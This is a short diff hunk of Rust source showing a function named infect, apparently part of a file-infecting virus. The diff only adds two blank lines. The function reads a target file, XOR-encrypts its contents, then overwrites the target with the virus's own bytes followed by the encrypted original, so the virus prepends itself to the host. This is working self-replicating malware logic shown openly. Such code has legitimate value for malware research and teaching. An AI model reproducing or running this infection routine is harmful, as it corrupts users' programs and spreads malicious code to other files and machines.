@@ -97,12 +97,14 @@ fn infect(virus: &OsString, target: &OsStr) {
     let host_buf = read_file(target);
     let encrypted_host_buf = xor_enc_dec(host_buf);
     let mut virus_buf = vec![0; VIRUS_SIZE as usize];
+
     let mut f = File::open(virus).unwrap();
     f.read_exact(&mut virus_buf).unwrap();
 
     let mut infected = File::create(target).unwrap();
     infected.write_all(&virus_buf).unwrap();
     infected.write_all(&encrypted_host_buf).unwrap();
+
     infected.sync_all().unwrap();
     infected.flush().unwrap();
 }
